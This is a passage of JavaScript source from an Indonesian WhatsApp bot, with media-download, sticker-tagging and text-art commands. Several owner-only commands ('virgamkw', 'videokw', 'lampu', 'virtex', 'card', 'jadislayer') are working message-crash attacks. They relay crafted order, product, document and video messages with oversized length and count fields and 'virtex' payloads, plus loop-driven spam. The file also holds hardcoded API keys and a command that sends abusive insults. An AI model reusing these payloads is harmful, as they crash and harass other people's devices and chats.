				fs.writeFileSync(`./media/xznsenpai.jpeg`, delb)
				fakeimage = fs.readFileSync(`./media/xznsenpai.jpeg`)
				xznsenpai.sendFakeStatus(from, `Sukses`, fake)
				break
			case 'getpic':
				if (qul.message.extendedTextMessage != undefined){
					mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await udin.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await xznsenpai.getBuffer(pic)
					xznsenpai.sendImage(from, thumb)
				}
				break
			    case 'imgtag':
				if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
					let media = await udin.downloadMediaMessage(encmedia)
					xznsenpai.hideTagImg(from, media)
				} else {
					xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}imgtag caption`, qul)
				}
				break
			    case 'sticktag': case 'stickertag':
				if (!isQuotedSticker) return xznsenpai.reply(from, `Reply sticker dengan caption *${prefix}stickertag*`, qul)
				let encmediai = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				let mediai = await udin.downloadMediaMessage(encmediai)
				xznsenpai.hideTagSticker(from, mediai)
				break
			    case 'kontaktag':
				argz = arg.split('|')
				if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}kontak @tag atau nomor|nama`, qul)
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					xznsenpai.hideTagKontak(from, mentioned[0].split('@')[0], argz[1])
				} else {
					xznsenpai.hideTagKontak(from, argz[0], argz[1])
				}
				break
			   case 'doctag':  case 'dokumentag': //by Dehanjing
		        if (!isQuotedDocument) return xznsenpai.reply(from, `Reply Document dengan caption *${prefix + command}*`, qul)
                quoted = JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                download = await udin.downloadMediaMessage(quoted)
                await fs.writeFileSync(`doc.txt`, download)
                var group = await udin.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                udin.sendMessage(from, fs.readFileSync(`doc.txt`), document, { contextInfo: {mentionedJid: mem }, quoted: qul, mimetype: 'text/plain' })
			    await fs.unlinkSync(`doc.txt`)
			    break
		       case 'giftag':   case 'giphytag': //by Dehanjing
                if (!isQuotedVideo) return reply(`Reply Gif nya dengan caption ${prefix + command}`)
                quoted = JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                download = await udin.downloadMediaMessage(quoted)
                await fs.writeFileSync(`giftag.gif`, download)
                var group = await udin.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                thumb = fs.readFileSync(`giftag.gif`)
                udin.sendMessage(from, thumb, video, { contextInfo: {mentionedJid: mem }, quoted: qul, mimetype: 'video/gif', thumbnail: thumb })
			    await fs.unlinkSync(`giftag.gif`)
			    break
			    case 'monyet':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}tahta teks`, qul)
				xznsenpai.sendMediaURL(from, image `https://api.zeks.xyz/api/hartatahta?text=${arg}&apikey=apivinz`)
				break
				//zeks api
				case 'tahta':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}tahta teks`, qul)
				ngery = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ&text=${arg}`)
				reply('tunggu lagi proses, gak bakalan lama seperti dia')
				udin.sendMessage(from, ngery, image, { quoted: qul })
				break
				case 'nulis':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix + command} teks`, qul)
				ngery = await getBuffer(`https://api.zeks.xyz/api/nulis?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ&text=${arg}`)
				reply('tunggu lagi proses, gak bakalan lama seperti dia')
				udin.sendMessage(from, ngery, image, { quoted: qul })
				break
				case 'dropwater':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix + command} teks`, qul)
				ngery = await getBuffer(`https://api.zeks.xyz/api/dropwater?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ&text=${arg}`)
				udin.sendMessage(from, ngery, image, { quoted: qul })
				break
				case 'playy':
                if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}play judul teks`, qul)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ&q=${arg}`)
				infomp3 = `*Lagu Ditemukan!!!*\nJudul : ${anu.result.title}\nSource : ${anu.result.source}\nUkuran : ${anu.result.size}\n\n\n*TUNGGU BENTAR NYET LAGI LODING*`
				buffer = await getBuffer(anu.result.thumbnail)
				udin.sendMessage(from, buffer, image, {quoted: fgclink, caption: infomp3})
				lagu = await getBuffer(anu.result.url_video)
				udin.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: qul})
				break
				case 'play':
			    if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
               var srch = args.join('')
    		   aramas = await yts(srch);
    	   	aramat = aramas.all 
   			var mulaikah = aramat[0].url							
               try {
               yta(mulaikah)
              .then((res) => {
               const { dl_link, thumb, title, filesizeF, filesize } = res
               axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
               if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam baltuk link_`)
               const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
               sendMediaURL(from, thumb, captions)
               await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
                case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break 
                case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
				case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
				case 'meme':
				anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ`)
			    epep = await getBuffer(anu.result)
                udin.sendMessage(from, epep, image, {quoted: qul})
                break
                case 'estetikpic':
                epep = await getBuffer(`https://api.zeks.xyz/api/estetikpic?apikey=tClRTiOBl1GDTW0oYOp810QEFuQ`)
                udin.sendMessage(from, epep, image, {quoted: qul})
                break
				//Hadi
				case 'naruto':
				if (args.length < 1) return reply('Contoh : #naruto Zainudin Tanisha')
				anu = await xznsenpai.getBuffer(`http://hadi-api.herokuapp.com/api/photoxy/manga-naruto?teks=${arg}`)
				udin.sendMessage(from, anu, image, { quoted: fgclink })
				break
				case 'flaming':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}flaming teks`, qul)
				anu = await xznsenpai.getBuffer(`http://hadi-api.herokuapp.com/api/photoxy/flaming-fire?teks=${arg}`)
                udin.sendMessage(from, anu, image, { quoted: fgclink })
                break
				case 'neon':
                if (args.length < 1) return reply('Contoh : #neon Zainudin Tanisha')
                anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/textmaker/neon?q=${arg}&apikey=lucilfer`)
               reply('tunggu lagi proses, gak bakalan lama seperti dia')
                buffer = await getBuffer(anu.result.url)
                udin.sendMessage(from, buffer, image, {quoted: qul })
                break
                    /*
			case 'pubg':
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, qul)
				argz = arg.split("|")
				if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, qul)
				axios.get(`https://udinbot-api.herokuapp.com/api/textmaker/game?text=${argz[0]}&text2=${argz[1]}&theme=pubg&apikey=udinBot`)
				.then((res) => xznsenpai.sendMediaURL(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					xznsenpai.reply(from, mess.error.api, qul)
				})
				break
				*/
				//fake
				case 'fake':
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: fgclink })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: flokasi })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: fvideo })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: sft })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: dinn })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: fdocs })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: fgif })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: ftextt })
				udin.sendMessage(from, `nih liat`, MessageType.text, {quoted: fvn })
               break
				//bug
				/*case 'p':
                if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
                for (let i = 0; i < 50; i++) {
                const response = udin.sendMessage(from, "Awokawok", "conversation", { quoted: dinn })
                }
               break*/
case 'tebas':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const lol = fs.readFileSync(`./media/xznsenpai.jpeg`)
await udin.toggleDisappearingMessages(from)
udin.sendMessage(from, lol, image, { quoted: dinn, caption: virtex()})
break
case 'virgamkw':
res = await udin.prepareMessageFromContent(from, {"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AifAWCqQRbuzRbKq7eyy_Ony2nKj2pskheEJo9J6J1ff.enc", "mimetype": "image/jpeg", "caption": "Ni dah jadi bwang", "fileSha256": "ZMfb5z5mHxnojNHeb2xy5J+YPodUtKcq6USLub9yB+g=", "fileLength": "999999999999999999", "mediaKey": "utKqxsHCcRJxtarxzLysAvIIee8qjemoxjphX0NDm60=", "fileEncSha256": "OnjcPiCDbtLQ3acEO6n9GyyM9OOrA8vaPpH7DQ+npEs=", "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg')}}, {quoted: flokasi, contextInfo:{}}) 
udin.relayWAMessage(res)
break
case 'videokw':
res = await udin.prepareMessageFromContent(from, {"videoMessage": {"url": "https://mmg.whatsapp.net/d/f/AgYInUL3E75kU-OkMuqbSOA2IeuNZoDEudth0PjKngpj.enc", "mimetype": "video/mp4", "fileSha256": "jecELkOrxScyYz6RPZs3cuynz7mhdQg/GfBQCNHxo6k=", "fileLength": "999999999999999999", "seconds": 999999999, "mediaKey": "jFFm13B3ewOXyI95VAr/plNcwFV8PYSSQLunEYHkl4Q=", "height": 640, "width": 304, "fileEncSha256": "JZy9+ev1Ux5ffs6fhkrOSuZHQQsJ+myYWppIMj1eBvk=", "directPath": "/v/t62.7161-24/19275655_536141770831084_6512679268886376533_n.enc?ccb=11-4&oh=3b6b86a2f07d95493f3abb15e5307b82&oe=615841A6", "mediaKeyTimestamp": "1630647498", "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg'), "streamingSidecar": "hMJdcC50QV8KDiQrf/VqYEJ9tujwgFq2kG6MpqvtLl7SkFkyPTE0Mpr4wVfm26l+hEAyOAHIKGrSXkdRWwLlFVqzFCD6y1VL4MwtHcs3T1/v0+fjUUZY2/Qlrs+C05xNELJjuDpVwjViLpG9aVJcR5QRiXNgUj5o"}}, {quoted: qul, contextInfo:{}}) 
udin.relayWAMessage(res)
break
case 'katalog':
case 'jadislayer':
if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
 replyy(mess.wait)
if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
let media = await udin.downloadMediaMessage(encmedia)
imeu = await udin.prepareMessage('0@s.whatsapp.net', media, image, {thumbnail: fs.readFileSync("./virus/virgam.jpg")})
imeg = imeu.message.imageMessage
res = await udin.prepareMessageFromContent(from,{"productMessage": { "product": {"productImage": imeg, "title": "Xᴢɴ々SᴇɴPɑɪ", "description": virtexapi(), "retailerId": "github.com/xznsenpai", "descriptionCount": "999999999", "productImageCount": "1", }, "businessOwnerJid": "6282256080304@s.whatsapp.net", "contextInfo": {"forwardingScore": 9999, "isForwarded": true}}}, {quoted: qul})
udin.relayWAMessage(res)}
else {xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}jadislayer`, qul)}
break
case 'card':
if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}card teks|jumlahspam`, qul)
argz = arg.split("|")
if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}card teks|jumlah`, qul)
if (isNaN(argz[1])) return xznsenpai.reply(from, `harus berupa angka`, qul)
for (let i = 0; i < argz[1]; i++){
njir = await udin.prepareMessageFromContent(from, {"orderMessage": {"orderId": "792749621388119", "sellerJid": "6282256080304@s.whatsapp.net", "thumbnail": fs.readFileSync('./virus/virgam.jpg'), "itemCount": 99, "status": "INQUIRY", "surface": "CATALOG", "message": `${argz[0]}`, "orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼??", "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg==" }, "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:flokasi, contextInfo:{}}) 
udin.relayWAMessage(njir)}
break
               case 'anu':
               if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
               await udin.toggleDisappearingMessages(from)
               teeks = args.join(' ')
               res = await udin.prepareMessageFromContent(from, {
					"orderMessage": {
						"orderId": "792749621388119",
						"sellerJid": "6282256080304@s.whatsapp.net",
						"itemCount": 999999999,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${teeks}`,
						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼𝙄",
						 "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
						 },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {quoted:dinn, contextInfo:{}}) 
                udin.relayWAMessage(res)
                break
				case 'xzn':
				case 'xznbug':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
                for (let i = 0; i < 5; i++) {await udin.toggleDisappearingMessages(from)}
                reply('nani bang')
                break
                  case 'sharelock':
                  ppp = `${args.join(' ')}`
                  send = ppp.split("|")[0];
                  ppp = `${virtexxx()}`
                  lok = ppp.split("|")[0];
                  udin.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
                  break
                  case 'senpai':
                  udin.sendMessage(from, virtex(), MessageType.text, { quoted: flokasi })
                  break
 case 'repeat':       
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
var xzn_kawaii = `${args.join(' ')}`
var kata = xzn_kawaii.split("|")[0];
var angka = xzn_kawaii.split("|")[1]
let meme = `${kata}`.repeat(angka)
udin.sendMessage(from, meme, MessageType.text, { quoted: flokasi })
break
                  case 'lokasi':
                  ppp = `𝙓𝙕𝙉𝙎𝙀𝙉𝙋𝘼𝙄`
                  send = ppp.split("|")[0];
                  ppp = `${virtexxx()}`
                  lok = ppp.split("|")[0];
                  udin.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
                  break
                  case 'lampu':
                  res = await udin.prepareMessageFromContent(from, {
                  "documentMessage": {
                  "url": "https://mmg.whatsapp.net/d/f/AilUh954hcQMOrdYZt8MQWuxa8mYNwk2fAcfd3UAFybW.enc",
                  "mimetype": "application/octet-stream",
                  "title": virtexxx(),
                  "fileSha256": "HrLLZbtNdPEDgW+4DyrVTsa1UrDQMAPS0BhHKwGIEME=",
                  "fileLength": "9999999999",
                  "pageCount": 0,
                  "mediaKey": "fK8gJ5p6C1hRa3kSfdTisyN5oImTfkmZ2OeZ4nn57sg=",
                  "fileName": virtau(),
                   "fileEncSha256": "eg89yLTEK3cSupvtM+9ti/ur5uCTSnHeimXuzVwC5Q4=",
                  "directPath": "/v/t62.7119-24/26964934_836911823610583_4517535723289492243_n.enc?ccb=11-4&oh=42c70b9e56a041040f7eb2898a6e7f6d&oe=6116210D&_nc_hot=1626417230",
                    "mediaKeyTimestamp": "1626245805"
                   },
                   }, {contextInfo:{}}) 
                udin.relayWAMessage(res)
                break
                  case 'lok':
				res = await udin.prepareMessageFromContent(from, {
			"liveLocationMessage": {
            "degreesLatitude": 55.1121221,
            "degreesLongitude": 55.1121221,
            "caption": `${virtau()}`,
            "sequenceNumber": "1626189673252001"
            },
            "contextInfo": {
               "forwardingScore": 999,
               "isForwarded": true
                }
                }, {quoted: dinn, contextInfo:{}}) 
                udin.relayWAMessage(res)
                break
                case 'sendkontak':
                res = await udin.prepareMessageFromContent(from, {
                 "contactMessage": {
                 "displayName": "XZN",
                 "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:2;XZN;ana;;\nFN:XZN\nitem1.TEL;waid=0:+62 812-1665-4518\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Anjay\nX-WA-BIZ-NAME:XZN\nEND:VCARD"
                }
                }, {quoted: dinn, contextInfo:{}}) 
                udin.relayWAMessage(res)
                break
                  case 'peson':
                  if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
                  const dj13mp3 = fs.readFileSync('./assets/dj13.mp3');
				  udin.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
                  udin.sendMessage(from, dj13mp3, MessageType.audio, {quoted: dinn, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
				  break
				  case 'pesoff':
				  if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
			      udin.toggleDisappearingMessages(from, 0)
				  break
                  //gw solo lu maju semua
              case 'toxicbot':
					kapankah = body.slice(1)
					const toxic =['anjing','babi lu','anak anjing','udah tolol nub Lagi','muka lo kek monyet','udah jomblo sendirian lagi dirumah tolol','so so an mau punya pacar muka aja kek monyet lepass dari kandang','ganteng doang di toxic aja dibilang baperan','pantek kau','bangsat kau','ku entod kalian nangis kau','memek lu semua','lihat anak anjing lagi baca','ganteng doang jemput cewe dipanggang','kamu cantik beb bullshit anjing cowo buaya','anak dajjal','puki lu','anjing ngajak gelud','sama hantu takut cupu ngentod','cupu cupu aja gausah bacot','kontol lu semua','bocah lu semua kontol','3 Hari Lagi']
					const ole = toxic[Math.floor(Math.random() * toxic.length)]
					udin.sendMessage(from, ole, MessageType.text, { quoted: dinn })
					break
					case 'bukanmain':
					spl = body.slice(1)
					const quoo =['Dia yg jadiin org pelampiasan, malah dia yg dijadiin pelampiasan','pacaran tidak perlu, yg penting kepala musuh nomor1','siang farming pahala\nmalam farming kepala','Mata Akan Lupa Siapa Yang Ia Lihat, Tapi Hati Akan Ingat Siapa Yang Ia Cintai','cape cape aku caper, eh dianya ga baper baper','Berdoa ke tuhan minta pacaran, tetapi doa-nya larangan tuhan','Lo yang salah, lo yang galak','Dia yg niat nge baperin, malah dia yg baper','cape-cape aku caper, eh dianya gasuka cewe.','Jadi TUA itu pasti, Jadi DEWASA itu pilihan','Kamu yang sekarang mungkin salah satu doamu di masa lalu','Sekarang kamu yg ada di bionya, mungkin besok aku yg ada di kartu keluarganya','Hidup lo, Konten gue','Hidup lo, Konten gue']
				const teees = quoo[Math.floor(Math.random() * quoo.length)]
				udin.sendMessage(from, ''+teees+'\n\n#BUKANMAIN', MessageType.text, { quoted: qul })
				break
					case 'tes':
				quotes = body.slice(1)
				const quo =['Lebih baik mengerti sedikit daripada salah mengerti.','Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.','Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.','Penderitaan adalah pelajaran.','Ilmu pengetahuan tanpa agama adalah pincang.','Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.','Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.','Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?','Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.','Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.','Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.','Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.','Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.','Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.','Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.','Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.','Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.','Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.','Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.','Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.','Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.','Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.','Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.','Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.','Anda tidak perlu harus berhasil pada kali pertama.','Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.','Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.','Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.','Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
				const tes = quo[Math.floor(Math.random() * quo.length)]
				udin.sendMessage(from, ''+tes+'\n\n_By : ꭙࣼznsenpai༻', MessageType.text, { quoted: fvideo })
				break
		      case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Gak Bisa Lu Tolol','Nanya Mulu Anjim','Cuba Pegang Dadamu Bisa Apa Engga','Gak Bisa Mending Lu Coli','Bisa Asal Kamu Usaha','Mana Saya Tau Anjim','Bot Ngambek Gak Mau Jawab','Bisa Aja Enggak','dih bege tanya kok sama bot','Ulangi Tod Kaga Faham Gw']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					udin.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, MessageType.text, { quoted: qul })
					break
			 case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					udin.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, MessageType.text, { quoted: qul })
					break
           case 'apakah':
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Iya Lu Tolol Bot Di Tanya','Mana Saya Tau','Iya Iya Fix','dih bege tanya kok sama bot','Lu siapa sih ajg nanya mulu','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					udin.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, MessageType.text, { quoted: qul })
					break
					case 'cmdsticker':
					const tttt = fs.readFileSync(`./tikel/1.webp`)
                    const ttttt = fs.readFileSync(`./tikel/2.webp`)
                    const tttttt = fs.readFileSync(`./tikel/3.webp`)
                    const ttttttt = fs.readFileSync(`./tikel/4.webp`)
                    const tttttttt = fs.readFileSync(`./tikel/5.webp`)
                    udin.sendMessage(from, tttt, sticker, {quoted:fvideo })
                    udin.sendMessage(from, ttttt, sticker, {quoted:fgclink })
                    udin.sendMessage(from, tttttt, sticker, {quoted:flokasi })
                    udin.sendMessage(from, ttttttt, sticker, {quoted:flokasi })
                    udin.sendMessage(from, tttttttt, sticker, {quoted:flokasi })
                    break
             case 'virtex':
             if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
            //udin.sendMessage(from, virtex(), MessageType.text, { quoted: dinn })
            await udin.toggleDisappearingMessages(from)
               res = await udin.prepareMessageFromContent(from, {
					"orderMessage": {
						"orderId": "792749621388119",
						"sellerJid": "6282256080304@s.whatsapp.net",
						"itemCount": 999999,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${virtex()}`,
						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼𝙄",
						 "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
						 },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {quoted:dinn, contextInfo:{}}) 
                udin.relayWAMessage(res)
               break
            case 'linkgc1':
            if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
					linkgc = await udin.groupInviteCode(from)
                    anunya ='https://chat.whatsapp.com/'+linkgc
